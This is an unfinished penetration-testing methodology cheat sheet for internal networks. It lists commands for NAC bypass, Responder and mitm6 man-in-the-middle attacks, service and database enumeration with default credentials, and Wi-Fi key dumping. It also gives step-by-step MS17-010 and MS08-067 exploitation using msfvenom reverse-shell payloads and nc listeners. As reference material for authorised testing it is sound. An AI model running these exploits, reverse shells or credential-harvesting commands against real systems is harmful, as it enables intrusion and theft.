# Internal network penetration test methodology 

1. [Network recognition](#Network-recognition)
    1. [Network access](#Network-access)
        1. [Wired network](#Wired-network)
        2. [Wifi network](#Wifi-network)
    2. [Network segmentation](#Network-segmentation)
        1. [Cartography of the reachable networks](Cartography-of-the-reachable-networks)
    3. [Network exposure services](#Network-exposure-services)
        1. [Ports of the active network nodes](#Ports-of-the-active-network-nodes)
        2. [Gather information about the exposed services](#Gather-information-about-the-exposed-services)
        3. [Interact with TCP services](#Interact-with-TCP-services)
        4. [Interact with UDP services](#Interact-with-UDP-services)
        5. [Check for databases exposed](#Check-for-databases-exposed)  
    4. [Network services exploitation](#Network-services-exploitation)
        1. [Check services vulnerabilities](#Check-services-vulnerabilities)
        2. [Windows known remote exploit](#Windows-known-remote-exploit)
        3. [Linux known remote exploit](#Linux-known-remote-exploit)
        4. [Exploit TCP services](#Exploit-TCP-services)
        4. [Exploit UDP services](#Exploit-UDP-services)
        5. [Check service using default password](#Check-service-using-default-password)
        6. [Check service using weak password](#Check-service-using-weak-password)
        7. [Check web interfaces](#Check-web-interfaces)
        8. [Access to a database](#Access-to-a-database)
        9. [Dump password from databases](#Dump-password-from-databases)
        10. [ApacheTomcat web application](#ApacheTomcat-web-application)
        11. [Using of password hashes](#Using-of-password-hashes)
2. [System](#System)
    1. [Unprivileged access](#Unprivileged-access)
		1. [Get a shell](#Get-a-shell)
        2. [RSA keys](#RSA-keys)
        3. [Bypass limited shell](#Bypass-limited-shell)
        4. [Bypass container](#Bypass-container)
        5. [Upload and download](#Upload-and-download)
        6. [Unix bash command](#Unix-bash-command)
        7. [Windows batch command](#Windows-batch-command)
        8. [Configuration files](#Configuration-files)
        9. [System recognition](#System-recognition)
    2. [Exploitation](#Exploitation)
        1. [Dump credentials from Windows](#Dump-credentials-from-Windows)
        2. [Dump hashes from Unix](#Dump-hashes-from-Unix)
        3. [Windows kernel exploit](#Windows-kernel-exploit)
        4. [Windows configuration exploit](#Windows-configuration-exploit)
        5. [Linux kernel exploit](#Linux-kernel-exploit)
        6. [Linux configuration exploit](#Linux-configuration-exploit)
        7. [Bypass anti-virus](#Bypass-anti-virus)
    3. [Privileged access](#Privileged-access)
        1. [Persistence](#Persistence)
        2. [Pivoting](#Pivoting)
3. [Active Directory](#Active-Directory)
	1. [Discovery](#Discovery)
    2. [Privilege escalation](#Privilege-escalation)
    3. [Credentials gathering](#Credentials-gathering)
	4. [Pivoting](#Pivoting)
    5. [Persistance](#Persistance)

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

# Network recognition
## Network access
### Wired network
#### Ethernet network 
    
Check if Network Access Control is setted, if yes, try to bypass it. There is different kind of NAC solution:
- Look for plug without NAC (printers)
- Spoof the MAC of an existing device using `sudo macchanger --mac=<MAC-ADDRESS> <INTERFACE>`
- You can also use `FENRIR` that you can download from the [FENRIR GitHub](https://github.com/Orange-Cyberdefense/fenrir-ocd)

Look for active hosts
- `sudo netdiscover -i <INTERFACE> -r <SUBNET>`
- `sudo arp-scan --localnet --bandwidth 16000 --ignoredups`
	- `sudo arp-scan <IP>/<CIDR> --bandwidth 64000 --ignoredups`
---

#### Listen the network passively 

Check the different kind of protocol <br>
Gather information about the current sub network as IP range, the gateway, the DNS server ...
- `wireshark` or `tcpdump`
    - In the point to limit the noise producted by your own device:
        - Disable your network: `sudo service network-manager stop`
        - Kill the dhclient process: `sudo ps aux |grep dhc`
        - Flush your interface: `sudo ip addr flush <INTERFACE>`
    - If there is a DHCP server:
        - `sudo dhclient -i <INTERFACE> -v`
    - If there is no DHCP server:
        - Update `sudo vi /etc/network/interfaces` to set a fixed IP
        - Set the configuration to set your IP: 
        ```
           auto <INTERFACE>
	       iface <INTERFACE> inet static
	       address <IP>
           netmask <MASK>
           gateway <GW>
        ```
        - `sudo service network-manager restart`
	    - `sudo service networking restart`
    - Other way to set a static IP : `sudo ifconfig eth0 <IP> netmask <MASK>`
    - To set a DNS : `/etc/resolv.conf`
    - To delete a route : `sudo route del -net <IP> gw <GW> netmask <MASK>`

- `sudo macchanger --mac=50:65:F3:BC:BF:F2 eth0`

---

#### Set up a DHCP locally

- `/etc/network/interfaces`
```
# eth0
auto eth0
iface eth0 inet static
address <IP>
netmask <MASK>
network <NETWORK>
broadcast <BROADCAST>
gateway <GW>
```

- `/etc/dhcp/dhcpd.conf`
```
	option domain-name "example.org";
	option domain-name-servers <IP-DNS1>, <IP-DNS2>;

	default-lease-time 600;
	max-lease-time 7200;

	subnet <NETWORK> netmask <MASK> {
	range <IP-MINIMUM> <IP-MAXIMUM>;
	option subnet-mask <MASK>;
	option broadcast-address <BROADCAST>;
	option routers <GW>;
	}
```

- `sudo /etc/init.d/isc-dhcp-server restart`
- `sudo /etc/init.d/isc-dhcp-server status`

---

#### Weak protocol

Look for weak/clear-text protocol on the network as HTTP, SNMP v1/v2, SMB v1, SMB unsigned, RTSP, AMQP
- `wireshark`
- `tcpdump`
- Use `cme smb <CIDR> --gen-relay-list <OUTPUT_FILE>` to enumerate all the workstations with SMB signing disabled

---

#### Man in The Middle 

- Perform MiTM attack to gather information 
    - `responder -I <INTERFACE> -f --lm -w`
        - Responder will allow you to catch `Net-NTLMv1/v2` (NTLMv1/v2) hashes that are used for network authentication. 
        - `Net-NTLMv1/v2` (NTLMv1/v2) can be used for NTLM-relay but not for Pass The Hash.
        - If you want to target only one IP you need to edit the `RespondDo` from `/etc/responder/Responder.conf`
    - Put `/proc/sys/net/ipv4/ip_forward` at `1` to perform forwarding

---

#### IPv6

- IPV6 port scan: `sudo nmap -p- -6 --min-rate 10000 <IPv6>`


- MiTM6

Since Windows Vista/Server 2008, IPV6 is enabled and prefered than IPv4. The point of the attack is to abuse the IPv6 configuration spoofing the DNS replies acting as a malicious DNS server

- Install [MiTM6](https://github.com/fox-it/mitm6), this tool target only Windows based system
- Listen with Wireshark for IPv6 configuration resquest, using `DHCPv6` 

---

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

### Wifi network

---

#### Gather wifi credentials locally

It is possible to dump the SSID and the password the device has been connected to
- Gather the SSID the workstation has been connected to: `netsh wlan show profiles`
- Get the clear text password associated to the SSID: `netsh wlan show profile name=<SSID> key=clear`
- Export wireless config: `netsh wlan export profile key=clear` will create one .XML file by SSID.

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Network segmentation

---

### Cartography of the reachable networks

Take note of the network that you can reach, the open and unfiltered ports.<br>
In light of the result try to guess the nature of each networks and determine if one of the networks is an administrative network. <br>
You should not be able to access administratives interfaces from the user network.
 
- Try to change some of the last digit of your current range, or make a scan on the /16 or /8 or your current network.
- Try to ping only the first node of a network to see if the IP range exist `for i in {1..255} ; do ping -c 2 X.X.$i.1; done | grep 'ttl='`
- Launch a scan on all the TCP ports `sudo nmap -Pn -sS -p- -vvv -oA <FILE> <IPRANGE>`
- Launch a scan on the most-used UDP ports `sudo nmap -sU -sV --top-ports 100 -vvv -oA <FILE> <IPRANGE>`

---

### Cartography of huge network

In huge networks, scanning all the ports of all the targets may take several days. The point is to find active workstations in several subnets in few hours.

- Find Windows and Linux up devices: `sudo masscan <SUBNET>/<CIDR> -p445,22 --rate 1000000 -oX <REPORT>`
    - Use `auxiliary/scanner/ssh/ssh_login` to test default credentials on SSH 
- Find web servers: `sudo masscan <SUBNET>/<CIDR> -p80,8080,443,8443,8008 --rate 1000000 -oX <REPORT>`
    - Use `auxiliary/scanner/http/title` to gather HTTP titles and find easily vulnerable or critical web applications
- Find databases: `sudo masscan <SUBNET>/<CIDR> -p1433,1521,27017,3306,5432,5000 --rate 1000000 -oX <REPORT>`
- Find UDP services: `sudo masscan <SUBNET>/<CIDR> --ports U:161,69,123,623 --rate 1000000 -oX <REPORT>`


- To dump IP from masscan XML report `grep -P -o -e '(?<=addr=").*?(?=")' <MASSCAN-REPORT> > <OUTPUT-FILE>`

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Network exposure services
### Ports of the active network nodes

Determine the service and the version and try to identify the nature of the devices (server, workstation, operating system ...)
    
- TCP Syn scan on all ports: `sudo nmap -Pn -sS -p- -vvv -oA <OUTPUT_FILE> <IP>`
    - Gather up devices: `cat <SS_OUTPUT>.gnmap| grep "Status: Up" |cut -d" " -f2`
    - Gather ports: 
		- `cat <SS_OUTPUT>.nmap| grep open |grep tcp |cut -d"/" -f1 |sort -u |sort -n |tr "\n" ","`
		- `grep -oP '\d{1,5}/open' <FILE>.gnmap |cut -d'/' -f1 |tr "\n" ","`
    - Syn scan with fingerprinting `sudo nmap -sV -p<OUTPUT_OF_THE_FILTER> -vvv -oA <OUTPUT_FILE> <IP>`
    - Use `-iL <TARGETS_FILE>` with one IP by line
- UDP scan on 100 most-used ports `sudo nmap -sU -sV --open --top-ports 100 -vvv -oA <OUTPUT_FILE> <IP>`
    - You can scan all the ports but it can be very long
- If the target do not respond to the ping use the `-Pn` option with nmap

- Process a clean and more readable nmap report :
	- `xsltproc <NMAPOUTPUT> -o <HTMLREPORT>`
	- `nmap-bootstrap-xsl` : https://github.com/honze-net/nmap-bootstrap-xsl
		- `nmap <OPTIONS> --stylesheet nmap-bootstrap.xsl <IP-TARGET>
		
---

### Gather information about the exposed services

Once the open port and the minimal information about their services and version have been identified, it could be profitable to gather more information about it using the default NSE nmap scripts.

- Default NSE script 
    - For TCP : `sudo nmap -sV -sC -p<OPEN PORT> -vvv -oA <FILE> <IP>` 
    - For UDP : `sudo nmap -sU -sV -sC -p<OPEN PORT> -vvv -oA <FILE> <IP>`

---

### Interact with TCP services 

Some services exposed to the network could be interactive and leak information. 

- **FTP** (21) 
	- `ftp <IP> <PORT>`
		- Default port is 21
	- `telnet <IP> <PORT>`
		- Will help you gather the banner, you can also use it if you want to use the native FTP command
	        - WiP (NATIVE FTP command)
	
- **SSH** (22) 
	- ssh `<USER>@<IP>`
		- Determine if it is a password or a publickey authentification
	- `telnet <IP> <PORT>`
		- Will help you gather the banner
  
- **SMTP** (25)
	- Enumerate the email address of the server  
		- Manually through `nc <IP> 25` or `telnet <IP> 25`
		- Some command: 
		
|                                                                                                         |
|---------------------------------------------------------------------------------------------------------|
|                                                                                                         |
|HELO : Allow the client to identify itself and start the SMTP conversation : `HELO <IP>` or `HELO <NDD>` |
|AUTH PLAIN : Allow the client to authenticate sending username and password combined to one string and base64 encoded                                                                                                   |
|AUTH LOGIN : Allow the client to authenticate sending username and password separately and base64 encoded|
|MAIL FROM : Specifies the email address of the sender, 1st command to send after HELO : `MAIL FROM <EMAIL>`                                                                                                  |
|RCPT TO : Specifies the email address of the recipient : `RCPT TO <EMAIL>`                               |
|VRFY : Asks the server to confirm that a specific email address exist or not, could be used for address enumeration : `VRFY <EMAIL>` or `VRFY <STRINGTOSEARCH>`                                                   |
|EXPN : Allow the client to request a mailing list to the server : `EXPN <STRINGTOSEARCH>`                |
|QUIT : Ask the server to close the connection : `QUIT`                                                   |

- **POP3** (110) 
    - WiP (command, attaque)

- **IMAP** (143/993)
	- Access to the e-mail.
		- `telnet <IP> 143`
		- `openssl s_client -connect <IP>:993` before each command you have to specify a *random string ID* as `01` 
		- Some command:

|                                                                                                         |
|---------------------------------------------------------------------------------------------------------|
|                                                                                                         |
| CAPABILITY : List the options and  capabilities that the server has : `<ID> CAPABILITY`                 |
| LOGIN : Allow the user to authenticate `LOGIN <EMAIL><@DOMAIN> <PASSWORD>`                              |
| LIST : Allow the user to list the different mailbox `LIST <PATH> <ARGUMENT>` to list everyting you can do `LIST "" "*"`  |
| SELECT : Allow the user to select the mailbox on which work `SELECT <MAILBOX>`                          |
| SEARCH : Allow the user to search in the selected mailbox `SEARCH <CRITERIA> "<STRINGTOSEQRCH>"` the criteria could be `FROM` `TO` `SINCE` `SUBJECT` ...  |

- **RPCBind** / **RPCclient**
    - `rpcclient -U "" <IP>` to login using null session
        - Command : `srvinfo` - `getdompwinfo` - `enumdomusers` - `enumdomgroups` - `queryuser <USERNAME>`

- **SMB** (445/139)
    - `smbclient -L \\<IP> -N`
        - `smbclient \\\\<IP>\\<FOLDER> -N`
    - `smbget`
    - `smbmap`

- **RDP** (3389) 
	- Access to the graphical desktop remotly with credentials.
		- `rdesktop -z -u '<USER>' -p '<PASSWORS>' -d <DOMAIN> <IP>:<PORT>`
		- `xfreerdp /u:<DOMAIN>\<USERNAME> /p:<PASSWORD> /port:<PORT> /v:<TARGET>`
		- `remmina`
		
- **VNC** (5900, 5902, 5800) 
	- Access (with credentials) to the graphical desktop remotly.
		- `vncviewer` then set the IP and the password
			- `vncviewer -passwd <PASSWORD-FILE> <IP>::<PORT>`

- **RTSP** (554) 
	- Access to the media streaming.
		- GUI: `VLC` - `Media Network` menu
			- Anonymous access: `rtsp//<IP>:<PORT>/`
			- Authenticated access: `rtsp://USERNAME:PASSWORD@IP:PORT/PATH`
		- Command line: `vlc rtsp://<IP>:<PORT>/<PATH>`

- **rlogin** (513) 
	- Connect remotely to the system with credentials.
		- `rlogin -l <USERNAME> <IP>`

- **rsh** (514)
		- Send remote command to system with credentials
		- `rsh <IP> -l <USERNAME> <COMMAND>`

- **WinRM** (5985)
    - Windows Remote Management (WinRM) is a feature of Windows Vista that allows administrators to remotely run management scripts.
        - auxiliary(scanner/winrm/winrm_login
        - auxiliary(scanner/winrm/winrm_auth_methods  
    - https://github.com/Hackplayers/evil-winrm
        - evil-winrm -i <IP> -u <USER> -p '<PASSWORD>'
            - To upload file on the target: `upload <FILE>`
            - To download file on the target: `download <FILE>`
            - Use `-s` to specify a path of a folder containing powershell scripts, then in the session type powershell script name to execute it on the target
                - The scripts have to be already in the folder before running the script
            - Then `menu` to see the all functions available
    - If you have credentials see : #Get-a-shell

- **DNS** (53)
	- When DNS is on TCP you need to test for zone transfer (identify hosts and possibly virtual hosts)
		- `dig axfr @<IP-TARGET> <DOMAIN-TARGET>`
			- `dig axfr . @<IP>`
		- `host -t axfr <DOMAIN-TARGET> <IP-TARGET>`
    - DNS BIND hostname/version
    - DNS cache snooping
    - DNS tunneling

- **IRC** (194,6665-6669)
	- `ncat <IP> <PORT>`
	- `PASS <PASSWORD>`
	- `NICK <NICKNAME>`
	- `USER <USERNAME> <HOSTNAME> <SERVERNAME> <REALNAME>`
		- Use what ever you want for `<HOSTNAME>` `<SERVERNAME>`
		- `<REALNAME>` need to start with `:`

- **SPICE** (Simple Protocol for Inedependent Computing Environments)
    - SPICE       

- **Redis**
	- redis-cli -h <IP> -p <PORT>
---

### Interact with UDP services
    
Some services exposed to the network could be interactive and leak information. 

- **SNMP** (161, 162)
	- WiP

- **TFTP** (69) 
	- `telnet <IP> 69`
    - `tftp <IP>`
		- Download a file : `get /<FOLDER>`
            - In its response the server will show the full path
            - `tftp` cannot download a folder
		- If doing : `get /windows/system32/config/SAM` get you `The process cannot access windows/system32/config/SAM because it is being used by another process`you are `SYSTEM`
		- If `get /DOCUME~1` is `C:\Documents & Settings` it is an XP
		- Access Program Files 32b version : `get /Progra~1`
		- If `get /Progra~2` is not find, the computer is a 32b		
		- User binary mode : `mode binary`
		- Upload a file : `put <FILE> <PATH>/<FILE>`
- **NTP** (123) 
	- WiP

- **IPMI** (623)
	- WiP

- **DNS** (53)
	- `nslookup`
	- `server <IP-TARGET>`
	- `<IP-TARGET>` - `<HOSTNAME-TARGET>`

---

### Check for databases exposed

Exposed databases are a good way to gather information or get remote code execution on the server. You can find different type of databases as, Oracle, MySQL, SQL server, PostgreSQL ... <br>
To get access on it, you can try the default credentials, use disctionnary or pattern.
<br>

- **Generic** : `dbeaver -h`
    - Permet d'intéragir avec MS-SQL, Azure, MySQL, Oracle .... en GUI 
    - Ajouter une connexion (file, new)

#### SQL server

- Default port : 1433

- Default account for MS-SQL is the `sa` account (without password or with `sa`). This account is sysadmin on the database
- **mssqlclient.py** : `mssqlclient.py <USERNAME>:<PASSWORD>@<IP> -db <DATABASE> -p <PORT>`
- **mssql-cli** `mssql-cli -U '<USERNAME>' -P '<PASSWORD>' -S 10.203.130.16` to connect to the database. 
    - List all the databases through `\ld`
    - List all the tables through `\lt`
    - List all users you can use to connect to the DB `SELECT * FROM SYS.SQL_LOGINS;`
    - Tips : When the result of the command is to big it is display inside a `less` command, to save the output in a file, scroll to the end, go up, lean `s`, write the name you want for the file
- **sqsh** : `sqsh -S <NAME>`
    - Configure : `/etc/freetds/freetds.conf`
    ```
    [<NAME>]
    host = 10.11.1.128
    port = 27900
    tds version = 8.0
    ```
    - Configure : `~/.sqshrc`
    ```
    \set username=sa
    \set password=password
    \set style=vert              
    ```
    - Some  commands :
        - `SELECT name FROM master..sysdatabases` then `go`
        - `sp_databases` then `go`

- Linked Servers : 
    - https://blog.netspi.com/how-to-hack-database-links-in-sql-server/
    - https://0xdf.gitlab.io/2020/06/08/endgame-poo.html#huh

#### MySQL

- Default port : 3306

- The default account for MySQL is `root` without password
- **mysql** `mysql -u <USER> -p<PASSWORD> -h <IP>`
    - List all the databases through `show databases;`
    - List all the tables through `show tables;`
    - Get the hostname `SELECT @@hostname`
    - Get the version `SELECT user();`
- **metasploit plugins** :
    - `auxiliary/admin/mysql/mysql_enum`
    - `auxiliary/admin/mysql/mysql_sql`
    - `auxiliary/scanner/mysql/mysql_login`

#### PostgreSQL

- Default port : 5432

- No default account or password
- **psql** `psql -h <IP> -p <PORT> -U <USERNAME>`
    - List the databases through `\l`
    - List the users of the database through `\du`
    - List the tables through `\lt`
    - Dump data from the database `pg_dump`
- **metasploit plugins** :
    - `auxiliary/admin/postgres/postgres_sql`
    - `auxiliary/scanner/postgres/postgres_login`

#### Oracle

- Default port : 1521

- At the creation of the database a lot of users with default password are created, but in the earlier version (11.\*, 12.\*) most of the default account are locked or see their password change by the user at the installation. <br>
Nevertheless on older version (9.\*) the defaults accounts will not be locked by default and will keep their default password.
- **sqlplus** `sqlplus <USERNAME>/<PASSWORD>@<TARGET>`. You can list the tables through `SELECT OWNER, TABLE_NAME FROM DBA_TABLES;`, list all the users through `SELECT USERNAME, USER_ID FROM ALL_USERS;`. <br>
- **metasploit plugins** :
    - `auxiliary/admin/oracle/oracle_sql`
    - `auxiliary/scanner/oracle/oracle_login`

| Username   | Default password  | Observation                         |
|------------|-------------------|-------------------------------------|
| SYSTEM     | MANAGER           | Password is created at installation |
| SYS        | CHANGE_ON_ INSTALL| Password is created at installation |
| SYSMAN     | n/a               | Password is created at installation |             
| ANONYMOUS  | ANONYMOUS         | Expired and locked on new version   |
| CTXSYS     | CTXSYS            | Expired and locked on new version   |
| DBSNMP     | DBSNMP            | Expired and locked on new version   |
| LBACSYS    | LBACSYS           | Expired and locked on new version   |
| MDSYS      | MDSYS             | Expired and locked on new version   |
| OLAPSYS    | MANAGER           | Expired and locked on new version   |
| ORDPLUGINS | ORDPLUGINS        | Expired and locked on new version   |
| ORDSYS     | ORDSYS            | Expired and locked on new version   |
| OUTLN      | OUTLN             | Expired and locked on new version   |
| SCOTT      | TIGER             | Expired and locked on new version   |
| WKSYS      | WKSYS             | Expired and locked on new version   |
| WMSYS      | WMSYS             | Expired and locked on new version   |
| XDB        | CHANGE_ON_INSTALL | Expired and locked on new version   |
| ORACLE_OCM | ORACLE_OCM        | Expired and locked on new version   |
| ORDPLUGINS | ORDPLUGINS        | Expired and locked on new version   |


#### Sybase

- Default port : 5000

- Default account for MS-SQL is the `sa` account (without password or with `sa`). This account is sysadmin on the database
- **sqsh** : `sqsh -U <USERNAME> -S <TARGET:PORT> -D <DATABASE>`
    - List the databases : `sp_databases`
    - List the tables : `sp_tables`
    - List all the users : `sp_helpuser`

#### MongoDB

- Default port (27017)
- No default account or password

- For MongoDB : You can use `mongo <TARGET>:<PORT>/<DATABASE> -u <USERNAME> -p <PASSWORD>`. You can list the tables through `show dbs`, list all the tables through `show collections`, display table objects `db.<TABLENAME>.find()`. <br>
- You can also use a `metasploit` plugin :
    - `auxiliary/scanner/mongodb/mongodb_login`

[//]: <>
[//]: <> (NEW SECTION)
[//]: <>

## Network services exploitation

---

### Check services vulnerabilities
    
After gathering information about the system and their version in all the ports, it is necessary to check if a public exploit exist on one of the service exposed on the network. <br>
If you found an exploit, read it and add the necessary modifications before to launch it.

- Nmap NSE vuln category modules : `sudo nmap <OPTION> --script vuln <IP>`


- Use `searchsploit <TOOL> <VERSION>`
    - `searchsploit --nmap <NMAPOUTPUT.XML>` the XML file has been generated by nmap with the `-sV` option.
- You can import nmap output to metasploit database doing `db_import <NMAPOUTPUT.xml>` (`postgresql` service need to be started) and use the `vulns` command.
- Use `pompem` WiP


- Search on browser
	- GitHub
	- CVEDetails
	
---

### Windows known remote exploit

Windows

- **MS17-010 (CVE-2017-0143)**
    - Exploit: `/usr/share/exploitdb/exploits/windows/remote/42315.py`
        - Dependency: https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
        - Modify `USERNAME='//'`
        - Modify 
        ```c 
        smb_send_file(smbConn, '/<PATH>/<REVERSE_SHELL>.exe', 'C', '/<REVERSE_SHELL>.exe')
        service_exec(conn, r'cmd /c c:\\<REVERSE_SHELL>.exe')
        ```
    - Generate the shell code: `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f exe > <REVERSE_SHELL>.exe`
    - Listen: `nc -nlvp <PORT>`
    - Run the exploit: `python 42315.py <IP> ntsvcs`
- **MS08-067 (CVE-2008-4250)**
    - Exploit: https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py
    - Generate the shell code: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b '\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40' -f c -a x86 --platform windows`
    - Listen: `nc -nlvp <PORT>`
    - Run the exploit: `python ms08-067.py <IP> <PORT>`
- **BlueKeep (CVE-2019-0708)**
    - WiP

### Linux known remote exploit

- WiP

--- 

### Exploit TCP services
        
The following services could be configured to authorize anonymous access

- **FTP** (21)
    - Could be anonymously accessible
        - `ftp <IP>`
        - `sudo nmap -sC -p21 <IP>`
        - `auxiliary/scanner/ftp/anonymous` with metasploit
    - Search for directory traversal
        - `ls ../../../`
        - `ftp> ls ../../../../<PATH>/`
    - Download file locally : `get ../../../../<PATH>/<FILE> <FILE>`
    - `perl dotdotpwn.pl -h <IP> -m ftp -t 300 -f <PATH>\<FILE> -s -q -b`
        - [Dotdotpwn](https://github.com/wireghoul/dotdotpwn) 

- **SMB** (445 over TCP, 137/139 NetBIOS over TCP, 137/138 over UDP) 
    - Could be anonymously accessible
        - `smbclient -L \\<IP> -N`
            - `smbclient \\\\<IP>\\<FOLDER> -N`
			- `smbclient -U <USERNAME> \\\\<IP>\\<FOLDER>`
        - `smbmap -H <IP>`
		- `smbmap -H <IP> -R --depth 5`
            - `smbmap -H <IP> -d <DOMAIN> -u <USERNAME> -p <PASSWORD>` if you have credentials
        - `smb:\\<IP>` through the browser 
        - `sudo crackmapexec smb <IP> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --shares`
            - `<USERNAME>` and `<PASSWORD>` can be null if you have no credentials
            - can also user `--users` ; `--rid-brute` ; `--pass-pol`
        - `smbget`
    - Gather information
        - `enum4linux -a <IP>`
        - `smbver.sh` : To get the version of **Samba** using tcpdump and smbclient (launch it with root rights)
            - https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh
                - `sudo tcpdump -s0 -n -i tap0 src <RHOST> and port <RPORT> -A -c 10 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]'`
                - `smbclient -L <RHOST>`
    - Nmap NSE for SMB vulnerabilities `sudo nmap -p139,445 -vvv --script "smb-vuln*"`
    - Nmap NSE for SMB anonymous access `sudo nmap -p139,445 -vvv --script "smb-enum*"`   
    - Nmap NSE for MS17-10 : `sudo nmap -p445 -vvv --script "*ms17-010*" <IP>`             
    - symlink attack WiP
    
- **Telnet** (23) 
    - Could be anonymously accessible
        - `telnet <IP>`

- **LDAP** (389/636) 
    - If binding is allowed, gather information about the directory, it could contain confidential information as NT password or username
        - `sudo nmap -sC -p 389 -vvv --script ldap-search <IP>`
        - Check anonymous LDAP authentication : `ldapsearch -x -h <IP>`
            - `ldapsearch -h <IP> -p <PORT> -x -s base -b '' "(objectClass=*)" "*" +`
            - `ldapsearch -h <IP> -p <PORT> -x -s base -b "ou=<OU>,dc=<DC>,dc=<DC>,dc=<DC>"`
        - `Softerra LDAP Browser`
		- Get the root DSE : `ldapsearch -x -h <IP> -s base namingcontexts`
			- RootDSE est défini comme la racine de l'arborescence de données sur un serveur d'annuaire
			- `ldapsearch -h <IP> -x -b "dc=<DC>,dc=<DC>"`
				- sambaNTPassword : MD4 hash, which is a hashing algorithm broken for over a decade.
					- Can be used to authenticate on SMB with smbclient for example
				- userPassword
					- `base64 -d <userPassword>` : `{HASH-ALGO}$<X>$<XXX>$<XXXXX>`
						- Remove `{HASH-ALGO}` and use `hashcat` or `john`
					
- **HTTP** (80/8080)
    - WiP : Cf Web methodologie

- **HTTPS** (443/8443) 
    - WiP : Cf Web methodologie

- **iSCSI** (860,3260) 
    - Could be anonymously accessible recursivly search for file that could contain confidential information.
        - WiP

- **SMTP**
    - Enumerate the email address of the server automatically
        - `nmap -vvv --script smtp-enum-users.nse -vvv <IP>`
        - `smtp-user-enum -M <MODE> -U <FILEUSERNAME> -t <IP>` with mode = VRFY or EXPN or RCPT you can also use `-u <STRINGTOSEARCH>`  

- **SSH**
    - `ssh-audit <IP>`

- **Oracle TNS Listener** (1521/1748)        
    - `tnscmd10g ping -h <IP>`
    - `tnscmd10g version -h <IP>`
    - `tnscmd10g status -h <IP>`
    - `tnscmd10g services -h <IP>`
    - Brute-force the SID : `sidguess -i <IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt`
    - ODAT [Oracle Database Attacking Tool](https://github.com/quentinhardy/odat)
        - Releases : https://github.com/quentinhardy/odat/releases/
        - Wiki : https://github.com/quentinhardy/odat/wiki
            - `./odat-libc2.5-i686 tnscmd -s <IP> -p 1521 --version`
            - `./odat-libc2.5-i686 tnscmd -s <IP> -p 1521 --status`
            - `./odat-libc2.5-i686 tnspoison -s <IP> -p 1521 -d <SID> --test-module`
            - `./odat-libc2.5-i686 sidguesser -s <IP> --sids-file=/mnt/hgfs/OSCP/Lab/Tools/odat/sids.txt`

- **Oracle XML DB**  
    - [Exploit Oracle XDB 9i Windows](https://github.com/6odhi/Python-Exploit-for-Oracle-9i-XDB-Windows-x86---HTTP-PASS-Overflow-Metasploit-/blob/master/xdbHttpExpoit.py)
        - Generate payload : `msfvenom -p windows/shell_reverse_tcp LHOST=<LOCAL-IP> LPORT=<LPORT> EXITFUN=thread --platform windows -a x86 --smallest -f python -v shellCode -b '\x00'`
        - Update the following line : `connect=s.connect(('<IP>', <RPORT>))`
        - Run the payload : `python xdbHttpExpoit.py`

- **Java RMI** 
	- `sudo nmap -sS -sV -vvv --script rmi-vuln-classloader,rmi-dumpregistry -p<PORT> <IP>`
	- [BaRMIe](https://github.com/NickstaDB/BaRMIe)
        - `java -jar BaRMIe_v1.01.jar -enum <IP> <PORT>`
        - `java -jar BaRMIe_v1.01.jar -attack <IP> <PORT>`
    - https://github.com/mogwaisec/mjet 
        - `use exploit/multi/misc/java_mlet_server`
        - `java -jar mjet.jar`
    - https://github.com/mogwailabs/mjet
    - ysoserial WiP

- **Internet Printing Protocol (IPP)** (631)
    - CUPS : `sudo nmap -p631 -vvv --script "cups*" -vvv -oA <FILE> <IP>`

- **Finger** (79)
	- https://github.com/pentestmonkey/finger-user-enum
	- Metaploit : `auxiliary/scanner/finger/finger_users`

- **rpcbind** (111)
    - `rpcinfo -p <IP>`
    ```
    100003  3,4         2049/tcp   nfs
    100003  3,4         2049/tcp6  nfs
    ```
    - `showmount -e <IP>`
    - `mount -t nfs <IP>:/ /mnt -o nolock`
    - `df -k`
    - `ls -l /mnt`

---

### Exploit UDP services

- **SNMP** (161, 162)
	- In case of bad configuration it could be possible to gather information about the local system, users, installed programs, processes and services running
		- `sudo nmap -sU -sC -sV -p161,162 -oA <FILE> <IP>` 
		- `snmpwalk -c <COMMUNITY:public> -Os -v<VERSION:1:2c:3> <TARGET> <OID>`
		- `snmpbulkwalk -c <COMMUNITY:public> -v<VERSION:1:2c:3> -Os -mALL <TARGET> .1`
		- `snmpenum.pl` and `snmp-check`
        - Modules of metasploit : `auxiliary/scanner/snmp/snmp_enum` and `scanner/snmp/snmp_enumusers`
		- You can use `onesixtyone -c <LIST> <IP>` to bruteforce the community name.

- **TFTP** (69) 
	- Recursivly search for file that could contain confidential information
		- For `TFTP` : TFTP do not allow the directory and file listing, you have to bruteforce it 
		- `sudo nmap -sU -p69 -vvv --script tftp-enum.nse -oA <FILE> <IP>`
		- You can download them through the `get` command

- **NTP** (123) 
	- Connect on it to list the client of the server.
		-`ntpdc -c monlist <IP>`
			- Display the client list of the NTP server. A DDoS attack by amplification could be possible.

- **IPMI** (623)
	- Connect on it to check if it is vulnerable
		- For `IPMI` : Use `auxiliary/scanner/ipmi/ipmi_dumphashes` to check if it is possible to dump root password hash

- **DNS** (53)
	- BIND
		- `dig version.bind txt -c chaos @<IP> +norecurse`
		- `dig hostname.bind txt -c chaos @<IP> +norecurse`
	- Cache snooping
		- Initial request : `dig <EXAMPLE_DOMAIN> @<IP> -p <DNS_PORT> +norecurse`
			- Non-recursive queries instruct the DNS server not to contact another DNS server
			- `<EXAMPLE_DOMAIN>` is not resolved by the DNS server
		- Second request : `dig <EXAMPLE_DOMAIN> @<IP> -p <DNS_PORT>`
			-  Entry is now present in the DNS cache
		- Last request : `dig <EXAMPLE_DOMAIN> @<IP> -p <DNS_PORT> +norecurse`
			- We can determine if another Wi-Fi user visited a specific website by trying to resolve `<EXAMPLE_DOMAIN>` with `+norecurse`
